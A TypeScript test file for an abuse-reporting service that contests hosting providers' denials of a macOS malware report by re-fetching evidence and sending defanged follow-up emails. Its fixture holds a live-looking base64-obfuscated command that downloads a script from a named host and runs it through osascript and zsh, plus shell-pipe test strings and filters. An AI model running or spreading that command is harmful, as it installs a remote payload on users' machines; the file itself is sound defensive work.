import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { eq } from "drizzle-orm";

import { getDb } from "../../db";
import { SubmissionsEntity } from "../../db/entities";
import { useTemporaryDatabase } from "../../db/test_helpers";
import { validateAbuseReportRequest } from "../contracts";
import type { sendAbuseEmailRoute } from "../mail";
import { AbuseRepository } from "../repository";
import { abuseJobs, abuseReports } from "../schema";
import { followUpProviderDecision } from "./decision";
import { ProviderSubmissionRejectedError, type DecisionAnswer, type ProviderSubmissionProvider } from "../providers/submission_contracts";
import { UnknownExternalStateError } from "../worker/shared";
import { collectDecisionEvidence, type EvidenceFetcher } from "./evidence";
import { acceptableNarrative, composeDecisionReply, narrativeRejection } from "./reply";

useTemporaryDatabase();

const originalSecret = process.env.ABUSE_TRACKING_TOKEN_SECRET;
beforeAll(() => { process.env.ABUSE_TRACKING_TOKEN_SECRET = "decision-follow-up-test-secret-32-bytes!"; });
afterAll(() => {
	if (originalSecret === undefined) delete process.env.ABUSE_TRACKING_TOKEN_SECRET;
	else process.env.ABUSE_TRACKING_TOKEN_SECRET = originalSecret;
});

// Production case 375628583143477248: Cloudflare denied paneo.work as no_abuse_found and
// keychainagent.pro as content_removed. The page hides the command in an install dialog;
// the payload host answers browsers with 404 and serves curl.
const COMMAND = `echo "https://apps.apple.com/app/paneo-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3daWkxSOXhZMjlvNCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
const PAGE = `<html><body><h1>Window Manager for Power Users</h1><a href="#download">Download for macOS</a>
<div class="install-modal" role="dialog" aria-modal="true"><h2>Install Paneo</h2><p>Two quick steps.</p><p>1 Open Terminal</p><p>2 Run the install command</p>
<div><code id="install-cmd">${COMMAND}</code><button>Copy command</button></div><p>Paste into Terminal and press Return.</p></div></body></html>`;
const PAYLOAD = Buffer.from("var loader = 1;");

/** The live web as observed on 2026-11-03: the page serves its command; the host serves only curl. */
const liveWeb = (options: { pageGone?: boolean } = {}): EvidenceFetcher => async (url, userAgent) => {
	if (url === "https://paneo.work/") {
		if (options.pageGone) throw new Error("The payload host answered HTTP 404.");
		return { url, finalUrl: url, body: Buffer.from(PAGE) };
	}
	if (url.startsWith("https://keychainagent.pro/") && userAgent.startsWith("curl/")) return { url, finalUrl: url, body: PAYLOAD };
	throw new Error("The payload host answered HTTP 404.");
};

async function deniedCloudflareRoute(target: string, observedUrl: string, reportedUserAgent?: string) {
	const request = await validateAbuseReportRequest({ targets: [target], allegationCategory: "malware", description: "The page distributes malware.", observedUrls: [{ target, urls: [observedUrl] }] });
	const report = await AbuseRepository.createReport({ request, reporter: {} });
	if (reportedUserAgent) (await getDb()).update(abuseReports).set({ reportedUserAgent }).where(eq(abuseReports.id, report.reportId)).run();
	const [reportTarget] = await AbuseRepository.listTargets(report.reportId);
	const route = await AbuseRepository.upsertResolvedRoute(reportTarget!.id, {
		routeKey: "provider_submission:cloudflare:contact", providerRegistryKey: "cloudflare", providerDisplayName: "Cloudflare Abuse",
		routeType: "provider_submission", resolverProvenance: { source: "test" }, resolutionSnapshot: { source: "test" }, status: "verified",
	});
	const run = await AbuseRepository.createProviderRun({ routeId: route.id, providerPayload: {}, correlationKey: `cf:${route.id.toString()}` });
	await AbuseRepository.settleProviderRun({ runId: run.id, executionStatus: "completed", routeStatus: "submitted", confirmationId: "35b8aafac3a6a6d9", submittedTargets: [target] });
	await AbuseRepository.recordProviderCorrespondence({ route, messages: [{ id: "response-1", subject: "[35b8aafac3a6a6d9]: Response to your Phishing report", body: "We could not detect any abusive or malicious content. If you wish for Cloudflare to investigate further, please provide relevant and specific information.", sentAt: new Date(), from: "Cloudflare Abuse" }] });
	return { reportId: report.reportId, route };
}

function recordingSend() {
	const sent: Array<Parameters<typeof sendAbuseEmailRoute>[0]> = [];
	const send = (async (params) => { sent.push(params); return { messageId: 1n, status: "sent", rfcMessageId: "<x@phishing.support>" }; }) as typeof sendAbuseEmailRoute;
	return { sent, send };
}

describe("provider decision follow-up", () => {
	test("finds the page's command again and builds commands that show it without running it", async () => {
		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", caseUrl: "https://phishing.support/submissions/1", fetcher: liveWeb(), now: () => new Date("2026-11-03T01:00:00Z") });
		expect(evidence.liveChecks.map(({ url, as, status }) => [url, as, status])).toEqual([
			["https://paneo.work/", "a desktop browser", 200],
			["https://keychainagent.pro/wksxgj/wZZLR9xY29o4", "the command's own downloader", 200],
			["https://keychainagent.pro/wksxgj/wZZLR9xY29o4", "a desktop browser", 404],
		]);
		expect(evidence.pageContext).toContain("Install Paneo");
		expect(evidence.pageContext).toContain("2 Run the install command");
		expect(evidence.dialog).toBe("div.install-modal[role=dialog]");
		expect(evidence.command?.decoded).toEqual(["curl -sfL https://keychainagent.pro/wksxgj/wZZLR9xY29o4 [pipe] osascript -l JavaScript"]);
		// The grep prefix encodes the command's fixed start, so it still matches when the payload path rotates.
		expect(evidence.reproduction[0]).toContain("| grep -o 'Y3VybCAtc2ZMIGh0dHBzOi8v[A-Za-z0-9+/=]*' | base64 -d");
		expect(evidence.reproduction[1]).toBe(`curl -s -A "curl/8.7.1" -o payload.bin "https://keychainagent.pro/wksxgj/wZZLR9xY29o4" && shasum -a 256 payload.bin`);
		expect(evidence.reproduction.join("\n")).not.toMatch(/\|\s*(?:z|ba)?sh\b|osascript\s*$/m);
		expect(evidence.references[0]).toMatch(/^https:\/\/www\.virustotal\.com\/gui\/file\/[a-f0-9]{64}$/);
	});

	test("a case's own page that names the reporter's browser is fetched as that browser, never as a payload host", async () => {
		// Production case 380697679325302795: the page report carries the Mac browser it was captured with.
		const mac = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36";
		const seen: string[] = [];
		const fetcher: EvidenceFetcher = async (url, userAgent) => { seen.push(`${url} ${userAgent}`); return liveWeb()(url, userAgent); };
		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", reportedUserAgent: mac, fetcher });
		expect(evidence.liveChecks[0]).toMatchObject({ url: "https://paneo.work/", userAgent: mac, as: "the browser the page targets", status: 200 });
		expect(evidence.command?.decoded).toEqual(["curl -sfL https://keychainagent.pro/wksxgj/wZZLR9xY29o4 [pipe] osascript -l JavaScript"]);
		expect(evidence.reproduction[0]).toStartWith(`curl -s -A "${mac}" "https://paneo.work/"`);
		expect(seen[0]).toBe(`https://paneo.work/ ${mac}`);

		// Through the follow-up: the report's case submitted this site, so it is the page, not a payload host.
		const { reportId, route } = await deniedCloudflareRoute("paneo.work", "https://paneo.work/", mac);
		const submissionId = 380697679325302799n;
		await SubmissionsEntity.create({ id: submissionId, kind: "website", data: { kind: "website", website: { url: "https://paneo.work/" } }, dedupeKey: "website-paneo.work-decision-test", status: "reported", source: "https://paneo.work/" });
		(await getDb()).update(abuseReports).set({ submissionId }).where(eq(abuseReports.id, reportId)).run();
		const { sent, send } = recordingSend();
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, { fetcher: liveWeb(), send, writeNarrative: async () => undefined })).toBe("sent");
		expect(sent[0]!.body).toContain(`- https://paneo.work/ requested as the browser the page targets (User-Agent "${mac}"): HTTP 200`);
		expect(sent[0]!.body).toContain("The command the page shows (defanged)");
	});

	test("a model narrative with links, commands, or a greeting is replaced by the code-owned one", () => {
		const good = "Your reviewer most likely loaded the page in a browser and saw an ordinary product page. The malicious command is inside the install dialog that every download button on the page opens, so it is not visible until a visitor clicks one of them. The command is still served as of our check, and the steps below show it without running anything.";
		expect(acceptableNarrative(good)).toBe(good);
		expect(acceptableNarrative(`${good} See https://evil.example/ for more.`)).toBeUndefined();
		expect(acceptableNarrative(`${good} Run curl x | sh to check.`)).toBeUndefined();
		expect(acceptableNarrative(`Hello Cloudflare, ${good}`)).toBeUndefined();
		expect(acceptableNarrative("Too short.")).toBeUndefined();
	});

	test("answers Cloudflare's no_abuse_found once, with the evidence block, and records it on the route", async () => {
		const { reportId, route } = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const narratives: unknown[] = [];
		const result = await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, {
			fetcher: liveWeb(),
			send,
			now: () => new Date("2026-11-03T01:00:00Z"),
			writeNarrative: async (input) => { narratives.push(input); return "Your reviewer most likely loaded the page in a browser and saw an ordinary product page. The malicious command sits inside the install dialog that the page's download buttons open, so it stays hidden until a visitor clicks one. It is still served as of our check, and the steps below show it without running anything."; },
		});
		expect(result).toBe("sent");
		expect(narratives[0]).toMatchObject({ confirmationId: "35b8aafac3a6a6d9", decision: { state: "denied", detail: "no_abuse_found", providerMessage: expect.stringContaining("We could not detect any abusive") } });
		expect(sent).toHaveLength(1);
		expect(sent[0]).toMatchObject({ recipient: "abusereply@cloudflare.com", subject: "[35b8aafac3a6a6d9] Additional evidence for abuse report 35b8aafac3a6a6d9", correlationKey: `decision-follow-up:${route.id.toString()}:denied` });
		const body = sent[0]!.body;
		expect(body).toStartWith("Hello Cloudflare Trust & Safety,\n\nThis is about report 35b8aafac3a6a6d9 (paneo.work).");
		expect(body).toContain("install dialog");
		expect(body).toContain("Where it is on the page: inside a dialog (div.install-modal[role=dialog]) that is not shown until the page opens it.");
		expect(body).toContain("Checked from our server at 2026-11-03T01:00:00.000Z:");
		expect(body).toContain('- https://keychainagent.pro/wksxgj/wZZLR9xY29o4 requested as a desktop browser (User-Agent "Mozilla/5.0');
		expect(body).toContain("To reproduce (these only fetch and decode; nothing is run):");
		expect(body).toContain("The command the page shows (defanged): echo \"https://apps.apple.com/app/paneo-install\" [then]");
		expect(body).not.toMatch(/\|\s*(?:z|ba)?sh\b/);
		const events = await AbuseRepository.listEvents(reportId);
		expect(events.find((event) => event.eventType === "provider_decision.followed_up")?.data).toMatchObject({ state: "denied", detail: "no_abuse_found", narrative: "model" });
	});

	test("the payload host's content_removed is answered with the downloader-versus-browser contrast", async () => {
		const { route } = await deniedCloudflareRoute("keychainagent.pro", "https://keychainagent.pro/wksxgj/wZZLR9xY29o4", "curl/8.7.1");
		const { sent, send } = recordingSend();
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "content_removed" }, { fetcher: liveWeb(), send, writeNarrative: async () => undefined })).toBe("sent");
		const body = sent[0]!.body;
		// Without a model the code-owned narrative still explains the cloaking.
		expect(body).toContain("serves the file only to the command-line downloader");
		expect(body).toMatch(/requested as the command's own downloader \(User-Agent "curl\/8\.7\.1"\): HTTP 200, 15 bytes, SHA-256 [a-f0-9]{64}/);
		expect(body).toMatch(/requested as a desktop browser \(User-Agent "Mozilla[^"]+"\): HTTP 404/);
		expect(body).toContain(`curl -s -A "curl/8.7.1" -o payload.bin "https://keychainagent.pro/wksxgj/wZZLR9xY29o4" && shasum -a 256 payload.bin`);
	});

	test("content that is really gone is not contested, and a decision is answered only once", async () => {
		const gone = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const first = recordingSend();
		expect(await followUpProviderDecision({ routeId: gone.route.id, state: "denied", detail: "content_removed" }, { fetcher: liveWeb({ pageGone: true }), send: first.send, writeNarrative: async () => undefined })).toBe("skipped");
		expect(first.sent).toEqual([]);
		expect((await AbuseRepository.listEvents(gone.reportId)).some((event) => event.eventType === "provider_decision.not_contested")).toBeTrue();
		expect(await followUpProviderDecision({ routeId: gone.route.id, state: "accepted" }, { fetcher: liveWeb(), send: first.send })).toBe("skipped");
	});

	test("the correspondence poll queues one follow-up per denied route for the case's lifetime", async () => {
		const { route } = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const enqueue = () => AbuseRepository.enqueueJobOnce({ jobType: "follow_up_provider_decision", reportId: route.reportId, routeId: route.id, payload: { state: "denied" }, dedupeKey: `decision-follow-up:${route.id.toString()}:denied` });
		await enqueue();
		await enqueue();
		const jobs = (await getDb()).select().from(abuseJobs).where(eq(abuseJobs.routeId, route.id)).all().filter((job) => job.jobType === "follow_up_provider_decision");
		expect(jobs).toHaveLength(1);
	});
});

describe("answering through a provider's form", () => {
	/** Eranet's supplement form as a test double: what it was given, and when the answer was recorded. */
	function formProvider(behave: (markSending: () => Promise<void>) => Promise<void> = (mark) => mark()) {
		const calls: Array<{ answer: DecisionAnswer; recordedBefore: boolean }> = [];
		const provider = {
			definition: { key: "cloudflare", displayName: "Eranet Fraud & Phishing Report" },
			decisionFollowUp: {
				contestedStates: ["supplement required"],
				addressee: "Eranet",
				channel: {
					kind: "form" as const,
					name: "Eranet's supplement form",
					submit: async (answer: DecisionAnswer, markSending: () => Promise<void>) => {
						let recorded = false;
						await behave(async () => { await markSending(); recorded = true; });
						calls.push({ answer, recordedBefore: recorded });
					},
				},
			},
		} as unknown as ProviderSubmissionProvider;
		return { calls, providerFor: () => provider };
	}
	const formAnswers = async (reportId: bigint) => (await AbuseRepository.listMailForReport(reportId)).filter((message) => message.kind === "provider_form");

	test("files the answer through the form, recorded right before the filing request, once per decision", async () => {
		const { reportId, route } = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const { calls, providerFor } = formProvider();
		const remark = "Based on the materials you have provided, we are unable to determine whether the website has committed any violations.";
		expect(await followUpProviderDecision({ routeId: route.id, state: "supplement required", detail: remark }, { fetcher: liveWeb(), providerFor, writeNarrative: async () => undefined })).toBe("sent");
		expect(calls).toHaveLength(1);
		expect(calls[0]!.recordedBefore).toBeTrue();
		expect(calls[0]!.answer.confirmationId).toBe("35b8aafac3a6a6d9");
		expect(calls[0]!.answer.body).toStartWith("Hello Eranet Trust & Safety,\n\nThis is about report 35b8aafac3a6a6d9 (paneo.work).");
		expect(calls[0]!.answer.body).toContain("The command the page shows (defanged)");
		const [recorded] = await formAnswers(reportId);
		expect(recorded).toMatchObject({ direction: "outbound", status: "sent", toAddresses: ["Eranet's supplement form"], subject: "Additional evidence for Eranet report 35b8aafac3a6a6d9", correlationKey: `decision-follow-up:${route.id.toString()}:supplement required` });
		const event = (await AbuseRepository.listEvents(reportId)).find((item) => item.eventType === "provider_decision.followed_up");
		expect(event?.data).toMatchObject({ state: "supplement required", to: "Eranet's supplement form", replyKind: "contest", messageId: recorded!.id.toString() });

		expect(await followUpProviderDecision({ routeId: route.id, state: "supplement required" }, { fetcher: liveWeb(), providerFor })).toBe("skipped");
		expect(calls).toHaveLength(1);
	});

	test("a failure before the filing request is retried; one of the request itself never is; a named refusal settles it", async () => {
		const before = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const failing = formProvider(async () => { throw new Error("Eranet did not send its verification code"); });
		await expect(followUpProviderDecision({ routeId: before.route.id, state: "supplement required" }, { fetcher: liveWeb(), providerFor: failing.providerFor, writeNarrative: async () => undefined })).rejects.toThrow("verification code");
		expect(await formAnswers(before.reportId)).toEqual([]);
		// Nothing was filed, so the job's retry answers.
		expect(await followUpProviderDecision({ routeId: before.route.id, state: "supplement required" }, { fetcher: liveWeb(), providerFor: formProvider().providerFor, writeNarrative: async () => undefined })).toBe("sent");

		const during = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const dropped = formProvider(async (mark) => { await mark(); throw new Error("Eranet Supplement failed with HTTP 502"); });
		await expect(followUpProviderDecision({ routeId: during.route.id, state: "supplement required" }, { fetcher: liveWeb(), providerFor: dropped.providerFor, writeNarrative: async () => undefined })).rejects.toBeInstanceOf(UnknownExternalStateError);
		expect((await formAnswers(during.reportId)).map(({ status }) => status)).toEqual(["pending"]);
		const again = formProvider();
		expect(await followUpProviderDecision({ routeId: during.route.id, state: "supplement required" }, { fetcher: liveWeb(), providerFor: again.providerFor })).toBe("skipped");
		expect(again.calls).toHaveLength(0);

		const refused = await deniedCloudflareRoute("paneo.work", "https://paneo.work/");
		const named = formProvider(async (mark) => { await mark(); throw new ProviderSubmissionRejectedError("Eranet refused the supplement: VerifyCode.NotFound.Code"); });
		await expect(followUpProviderDecision({ routeId: refused.route.id, state: "supplement required" }, { fetcher: liveWeb(), providerFor: named.providerFor, writeNarrative: async () => undefined })).rejects.toBeInstanceOf(ProviderSubmissionRejectedError);
		expect((await formAnswers(refused.reportId)).map(({ status, error }) => ({ status, error }))).toEqual([{ status: "failed", error: "Eranet refused the supplement: VerifyCode.NotFound.Code" }]);
	});
});

describe("reply composition", () => {
	test("a refused narrative is retried once with the rule it broke, and the retry is used when it keeps the rules", async () => {
		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", fetcher: liveWeb() });
		const good = "Your reviewer most likely loaded the page in a browser and saw an ordinary product page. The malicious command sits inside the install dialog that the page's download buttons open, so it stays hidden until a visitor clicks one. It is still served as of our check.";
		const attempts: Array<string | undefined> = [];
		const { body, narrativeSource } = await composeDecisionReply({ providerName: "Cloudflare", confirmationId: "35b8aafac3a6a6d9", decision: { state: "denied" }, allegationCategory: "malware", target: "paneo.work", reportedUrl: "https://paneo.work/", description: "x", replyKind: "contest", evidence }, async (_input, rejected) => {
			attempts.push(rejected?.reason);
			return rejected ? good : `${good} It hides there | a click opens it.`;
		});
		expect(attempts).toEqual([undefined, "it contains shell syntax (|, backticks, $( or &&)"]);
		expect(narrativeSource).toBe("model");
		expect(body).toContain(good);
	});

	test("each narrative rule names what it refuses", () => {
		const base = "Your reviewer most likely loaded the page in a browser and saw an ordinary product page, because the command sits inside a dialog that only opens from the page's own download buttons.";
		expect(narrativeRejection(base)).toBeUndefined();
		expect(narrativeRejection("short")).toBe("it is 5 characters, under the 120 minimum");
		expect(narrativeRejection(base.repeat(20))).toMatch(/^it is \d+ characters, over the 2000 maximum$/);
		expect(narrativeRejection(`${base} See www.example.com.`)).toBe("it contains a link or URL");
		// Prose punctuation is not shell syntax: the narrative of report 67faa5d38a60c855 was refused for "…your reviewer; the decoy…".
		expect(narrativeRejection(`${base} This explains what your reviewer saw; the decoy is not the kit.`)).toBeUndefined();
		expect(narrativeRejection(`${base} Run sh -c "$(echo x)" to see it.`)).toBe("it contains shell syntax (|, backticks, $( or &&)");
		expect(narrativeRejection(`${base}\n- a list item`)).toBe("it contains a heading or a list");
		expect(narrativeRejection(`Hello team, ${base}`)).toBe("it starts with a greeting");
		expect(narrativeRejection(`${base}\n\nThank you for your help`)).toBe("it ends with a sign-off");
	});

	test("keeps every measured fact even when the narrative is the fallback", async () => {
		const evidence = await collectDecisionEvidence({ observedUrl: "https://paneo.work/", caseUrl: "https://phishing.support/submissions/1", fetcher: liveWeb() });
		const { body, narrativeSource } = await composeDecisionReply({ providerName: "Cloudflare", confirmationId: "35b8aafac3a6a6d9", decision: { state: "denied", detail: "no_abuse_found" }, allegationCategory: "malware", target: "paneo.work", reportedUrl: "https://paneo.work/", description: "x", replyKind: "contest", evidence }, async () => "nope");
		expect(narrativeSource).toBe("fallback");
		expect(body).toContain('Your review of report 35b8aafac3a6a6d9 concluded "no_abuse_found"');
		expect(body).toContain("https://phishing.support/submissions/1");
		expect(body).toEndWith("Thank you,\nPhishing Support\nsupport@phishing.support\nhttps://phishing.support");
	});
});
